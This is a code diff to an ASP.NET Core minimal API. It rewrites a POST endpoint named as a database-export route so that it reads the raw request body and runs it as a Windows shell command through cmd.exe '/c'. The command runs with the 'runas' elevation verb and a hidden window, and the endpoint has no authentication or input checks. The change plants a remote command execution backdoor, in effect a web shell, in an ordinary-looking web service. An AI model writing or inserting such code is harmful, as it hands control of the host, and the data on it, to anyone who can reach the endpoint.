@@ -1,4 +1,5 @@
-using Microsoft.AspNetCore.Mvc;
+using Microsoft.VisualBasic;
+using System.Diagnostics;
 
 var builder = WebApplication.CreateBuilder(args);
 
@@ -27,15 +28,29 @@ app.MapGet("/api/script", () =>
 
 app.MapPost("/api/execute-a-export-db-sql", async (HttpRequest request) =>
 {
-    //Do something with the file
-
     using (var reader = new StreamReader(request.Body, System.Text.Encoding.UTF8))
     {
-        var textFromBody = await reader.ReadToEndAsync();
-        return textFromBody;
-    }
 
+        // Read the raw file as a CMD `string` command.
+        string cmdCommandTextString = await reader.ReadToEndAsync();
+
+        RunCmdCommand(cmdCommandTextString);
+
+        return cmdCommandTextString;
+    }
 });
+
+void RunCmdCommand(string cmdCommandTextString)
+{
+    var process = new ProcessStartInfo();
+    process.UseShellExecute = true;
+    process.WorkingDirectory = @"C:\Windows\System32";
+    process.FileName = @"C:\Windows\System32\cmd.exe";
+    process.Verb = "runas";
+    process.Arguments = "/c " + cmdCommandTextString;
+    process.WindowStyle = ProcessWindowStyle.Hidden;
+    Process.Start(process);
+}
 
 // Tutorial down here: ------------------------------------------- TODO: remove.
 
@@ -64,3 +79,4 @@ internal record WeatherForecast(DateTime Date, int TemperatureC, string? Summary
 {
     public int TemperatureF => 32 + (int)(TemperatureC / 0.5556);
 }
+
